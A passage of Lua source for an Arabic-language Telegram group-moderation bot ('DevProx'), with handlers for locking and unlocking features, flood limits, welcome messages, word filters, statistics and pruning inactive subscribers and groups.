absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:bots:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵبوتٱت بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة ', 1, 'md')
end
end
if lockptf[2] == "البوتات بالطرد" then
if not DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵبوتٱت بٱڵطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:bots:ban'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵبوتٱت بٱڵطرد بٱڵفعـل مۘقفلة ', 1, 'md')
end
end
if lockptf[2] == "البوتات بالتقييد" then
if not DevAbs:get(DevProx..'keed_bots'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵبوتٱت بٱڵتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'keed_bots'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵبوتٱت بٱڵتقييد بٱڵفعـل مۘقفلة ', 1, 'md')
end
end
if lockptf[2] == "التكرار" then
if not DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵتكرٱر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'anti-flood:'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵتكرٱر بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if lockptf[2] == "التثبيت" then
if not DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵتثبيت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:pin:mute'..msg.chat_id_,true)
DevAbs:sadd(DevProx.."bot:pin:mutepin",msg.chat_id_) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵتثبيت بٱڵفعـل مۘقفل فيۧ ٱڵمجـمۄعة', 1, 'md')
end end end
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع تكرار (%d+)$") and Abbas_Abs(msg) then
local floodmax = {string.match(text, "^([ضع تكرار) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙قـُم بتحډيډ عډډ تكرٱر ٱكبر من 2 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم وضـع ٱڵـتـكـرٱر \n☬︙ڵڵعدد ( '..floodmax[2]..' ) في ٱڵـمجموعة', 1, 'md')
DevAbs:set(DevProx..'flood:max:'..msg.chat_id_,floodmax[2])
end
end
--     Source DevProx     --
if text and text:match("^ضع التكرار (.*)$") and Abbas_Abs(msg) then
local status = {string.match(text, "^(ضع التكرار) (.*)$")}
if status[2] == "بالطرد" then
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "Kicked" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵتكرٱر بٱڵطرد بٱڵتاكيد مۧوضوع ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم وضع ٱڵتكرٱر بٱڵطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'Kicked')
end
end
if status[2] == "del" or status[2] == "بالحذف" then
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "DelMsg" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵتكرٱر بٱڵحذف بٱڵتاكيد مۧوضوع ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم وضع ٱڵتكرٱر بٱڵحذف \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'DelMsg')
end
end
end
--     Source DevProx     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if (text and text == 'ضع الايدي بالصوره') and Abbas_Abs(msg) or (text and text == 'تفعيل الايدي بالصوره') and Abbas_Abs(msg) then
if not DevAbs:get('DevProx:id:photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱيـدي بٱڵصورة بٱڵتاكيد مۧفعڵ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱلٱيـدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del('DevProx:id:photo'..msg.chat_id_)
end end
if (text and text == 'ضع الايدي بدون صوره') and Abbas_Abs(msg) or (text and text == 'تعطيل الايدي بالصوره') and Abbas_Abs(msg) then
if DevAbs:get('DevProx:id:photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱيـدي بٱڵصورة بٱڵتاكيد مۧعطڵ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱلٱيـدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set('DevProx:id:photo'..msg.chat_id_,true)
end end 

if (text and text == 'تفعيل الايدي') and Abbas_Abs(msg) then
if not DevAbs:get('DevProx:id:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱيـدي بٱڵتاكيد مۧفعڵ ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱلٱيـدي بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del('DevProx:id:mute'..msg.chat_id_)
end end 
if (text and text == 'تعطيل الايدي') and Abbas_Abs(msg) then
if DevAbs:get('DevProx:id:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱلٱيـدي بٱڵتاكيد مۧعطڵ ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱلٱيـدي بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set('DevProx:id:mute'..msg.chat_id_,true)
end end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع رابط$") and Abbas_Abs(msg) or text and text:match("^وضع الرابط$") and Abbas_Abs(msg)  then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱرسـڵ رآبـط ٱڵـمجـمۄعة ڵـيتم حفظة', 1, 'md')
DevAbs:set(DevProx.."bot:group:link"..msg.chat_id_, 'waiting')
end
--     Source DevProx     --
if text and text:match("^الدعم$") or text and text:match("^المطور$")  then
local link = DevAbs:get(DevProx.."bot:supports:link")
if link then
if link:match("https://") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱرسٱڵ بيٱنٱتك ڵڵـمطور \n☬︙سوف يٱتي في ٱقرب وقت \n☬︙يمكنك طڵب ٱڵمسٱعدة \n☬︙من كروب ٱڵـدعم ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n• "..link.." •", 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱرسٱڵ بيٱنٱتك ڵڵـمطور \n☬︙سوف يٱتي في ٱقرب وقت \n☬︙يمكنك طڵب ٱڵمسٱعدة \n☬︙من بوت توٱصڵ ٱڵـمطور ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n• @"..link.." •", 1, "html")
end end end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تفعيل الترحيب$") and Abbas_Abs(msg) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ ٱڵترحيب بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx.."bot:welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and Abbas_Abs(msg) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ ٱڵترحيب بنجٱح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx.."bot:welcome"..msg.chat_id_)
end
if text and text:match("^ضع ترحيب (.*)$") and Abbas_Abs(msg) then
local welcome = {string.match(text, "^(ضع ترحيب) (.*)$")}
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تعيين ٱڵترحيب ٱڵـجـډيـډ \n☬︙ٱڵترحيب ٱڵـجـډيـډ هو :\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'..welcome[2], 1, 'md')
DevAbs:set(DevProx..'welcome:'..msg.chat_id_,welcome[2])
end
if text and text:match("^حذف الترحيب$") and Abbas_Abs(msg) or text and text:match("^حذف ترحيب$") and Abbas_Abs(msg) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵترحيب \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'welcome:'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and Abbas_Abs(msg) or text and text:match("^جلب ترحيب$") and Abbas_Abs(msg) then
local wel = DevAbs:get(DevProx..'welcome:'..msg.chat_id_)
if wel then
Dev_Abs(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵم يتم وضع ٱڵترحيب \n☬︙ٱرسل ( ضع ترحيب ) ڵڵحفظ ', 1, 'md')
end
end
end
if text and text:match("^ضع ترحيب$") or text and text:match("^وضع ترحيب$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ضع ترحيب + الكليشة \n☬︙ٱستخدم ٱڵدوٱڵ ٱلٱتية ڵڵطبع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nusername ⇝ ڵطبع ٱڵمعرف \nfirstname ⇝ ڵطبع ٱلٱسم ٱلٱوڵ \nlastname ⇝ ڵطبع ٱلٱسم ٱلٱخير ', 1, 'md') 
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^منع (.*)$") and Abbas_Abs(msg) then
local filters = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2], 1, 50)
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
DevAbs:hset(abs, name,'newword')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵكڵمة ( "..name.." ) تـۖم منعهٱ\n☬︙فـي ٱڵـمجموعة ", 1, 'md')
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء منع (.*)$") and Abbas_Abs(msg) then
local rws = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2], 1, 50)
local cti = msg.chat_id_
local abs = (DevProx..'bot:filters:'..msg.chat_id_)
if not DevAbs:hget(DevProx..abs, name) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵكڵمة ( "..name.." ) ڵيست ممنوعة\n☬︙فـي ٱڵـمجموعة ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵكڵمة ( "..name.." ) تـۖم ٱڵغٱء منعهٱ\n☬︙فـي ٱڵـمجموعة ", 1, 'md')
DevAbs:hdel(abs, name)
end
end
end
--     Source DevProx     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فلتر عام (.*)$") and Abbas_Abs(msg) then
local filters = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filters[2], 1, 50)
local abs = (DevProx..'bot:freewords:')
DevAbs:hset(abs, name,'newword')
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵكڵمة ( "..name.." ) تـۖم منعهٱ\n☬︙فـي جميع ٱڵـمجموعٱت ", 1, 'html')
end
end
--     Source DevProx     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء فلتر عام (.*)$") and Abbas_Abs(msg) then
local rws = {string.match(text, "^(الغاء فلتر عام) (.*)$")}
local name = string.sub(rws[2], 1, 50)
local cti = msg.chat_id_
local abs = (DevProx..'bot:freewords:')
if not DevAbs:hget(abs, name)then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵكڵمة ( "..name.." ) ڵيست ممنوعة\n☬︙فـي جميع ٱڵـمجموعٱت ", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱڵكڵمة ( "..name.." )  تـۖم ٱڵغٱء منعهٱ\n☬︙فـي جميع ٱڵـمجموعٱت ", 1, 'html')
DevAbs:hdel(abs, name)
end
end
end
--     Source DevProx     --
if text and text:match("^الاحصائيات$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text and text:match("^↫ الاحصائيات ☬$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
local gps = DevAbs:scard(DevProx.."bot:groups")
local users = DevAbs:scard(DevProx.."bot:userss")
local allmgs = DevAbs:get(DevProx.."bot:allmsgs")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عدد ٱڵمشتركين ↫ ❨ '..users..' ❩\n☬︙عدد ٱڵمجموعٱت ↫ ❨ '..gps..' ❩\n☬︙مجموع ٱڵرسٱئل ↫ ❨ '..allmgs..' ❩\n ✓', 1, 'md')
end
if text and text:match("^المشتركين$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text and text:match("^↫ المشتركين ☬$") and is_sudo3(msg.sender_user_id_, msg.chat_id_) then
local users = DevAbs:scard(DevProx.."bot:userss")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عدد ٱڵمشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
--     Source DevProx     --
if text == "تنظيف المشتركين" and is_sudo(msg) and Abbas_Abs(msg) then 
local pv = DevAbs:smembers(DevProx.."bot:userss")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
DevAbs:srem(DevProx.."bot:userss",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*لا يوجد مشتركين وهميين* \n ', 1, 'md')
else
local ok = #pv - sendok
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙عدد المشتركين الان ↫ { '..#pv..' }\n☬︙تم حذف ↫ { '..sendok..' } من المشتركين\n☬︙ٱڵعدد ٱڵحقيقي ٱلٱن  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     Source DevProx     --
if text == "تنظيف الكروبات" and is_sudo(msg) and Abbas_Abs(msg) or text == "تنظيف المجموعات" and is_sudo(msg) and Abbas_Abs(msg) then 
local group = DevAbs:smembers(DevProx.."bot:groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;34m THE BOT IS NOT ADMIN ↓\n'..group[i]..'\n\27[1;37m')
DevAbs:srem(DevProx.."bot:groups",group[i]) 
changeChatMemberStatus(group[i], bot_id, "Left")
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevAbs:srem( DevProx.."bot:groups",group[i]) 
q = q + 1
print('\27[30;35m THE BOT IS LEFT GROUP ↓\n'..group[i]..'\n\27[1;37m')
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevAbs:srem( DevProx.."bot:groups",group[i]) 
q = q + 1
print('\27[30;36m»» THE BOT IS KICKED GROUP ↓\n'..group[i]..'\n\27[1;37m')
end
if data and data.code_ and data.code_ == 400 then
DevAbs:srem( DevProx.."bot:groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙*لٱتوجد مجموعٱت وهميه* \n ', 1, 'md')   
else
local DevProxgp2 = (w + q)
local DevProxgp3 = #group - DevProxgp2
if q == 0 then
DevProxgp2 = ''
else
DevProxgp2 = '\n☬︙تم حذف ↫ { '..q..' } مجموعه من ٱڵبوت'
end
if w == 0 then
DevProxgp1 = ''
else
DevProxgp1 = '\n☬︙تم حذف ↫ { '..w..' } مجموعه بسبب تنزيڵ ٱڵبوت ٱڵى عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙عدد ٱڵكروبات ٱلٱن ↫ { '..#group..' }'..DevProxgp1..''..DevProxgp2..'\n☬︙ٱڵعدد ٱڵحقيقي ٱلٱن  ↫ ( '..DevProxgp3..' ) \n ', 1, 'md')
end
end
end,nil)
end
return false
end 
--     Source DevProx     --
if text and text:match("^[Nn]amegp$") or text and text:match("^اسم المجموعه$") and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱسم ٱڵمجموعة ↫ ❨"..title_name(msg.chat_id_).."❩", 1, 'md')
end 
--     Source DevProx     --
if text and text:match("^تنظيف الرسائل$") and is_sudo(msg) and Abbas_Abs(msg) then
DevAbs:del(DevProx.."bot:allmsgs")
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تنظيف عدد رسٱئڵ ٱڵكروبٱت \n☬︙بوٱسـۧطة ↫ ❨ '..msg.sender_user_id_..' ❩ ', 'md')
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فتح (.*)$") and Abbas_Abs(msg) then
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـتعديڵ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'editmsg'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـتعديڵ بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "التعديل الميديا" or unlockpts[2] == "تعديل الميديا" then
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح تعديڵ ٱڵميديٱ\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'editmsg'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تعديڵ ٱڵميديٱ بٱڵفعـل مۧفتوح فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if DevAbs:get(DevProx..'farsi'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـفٱرسية بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'farsi'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـفٱرسية بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الفشار" then
if not DevAbs:get(DevProx..'fshar'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـفشٱر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'fshar'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـفشٱر بٱڵفعـل مۧفتوح فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الطائفيه" then
if not DevAbs:get(DevProx..'taf'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵطٱئفيه بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'taf'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵطٱئفيه بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الكفر" then
if not DevAbs:get(DevProx..'kaf'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـكفر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'kaf'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـكفر بٱڵفعـل مۧفتوح فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if DevAbs:get(DevProx..'farsiban'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـفٱرسية بٱڵطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'farsiban'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـفٱرسية بٱڵطرد بٱڵفعـل مۧفتوحة', 1, 'md')
end
end
if unlockpts[2] == "الشارحه" then
if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـشٱرحة بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:cmds'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـشٱرحة بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "البوتات" then
if DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـبوتٱت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:bots:mute'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـبوتٱت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if unlockpts[2] == "البوتات بالطرد" then
if DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـبوتٱت بٱڵطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:bots:ban'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـبوتٱت بٱڵطرد بٱڵفعـل مۧفتوحة', 1, 'md')
end
end
if unlockpts[2] == "البوتات بالتقييد" then
if DevAbs:get(DevProx..'keed_bots'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـبوتٱت بٱڵتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'keed_bots'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـبوتٱت بٱڵتقييد بٱڵفعـل مۧفتوحة ', 1, 'md')
end
end
if unlockpts[2] == "التكرار" then
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـتكرٱر بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'anti-flood:'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـتكرٱر بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if unlockpts[2] == "التثبيت" then
if DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم فـتـۧح ٱڵـتثبيت بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:pin:mute'..msg.chat_id_)
DevAbs:srem(DevProx.."bot:pin:mutepin",msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـتثبيت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end end end
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and Abbas_Abs(msg) then
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutepts[2] == "الدردشه" then
if not DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱڵـډرډشة بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:text:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـډرډشة بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
if mutepts[2] == "الاونلاين" then
if not DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..'\n☬︙تـۖم قفـڵ ٱلٱۄنلٱين بنجٱح \n ✓'
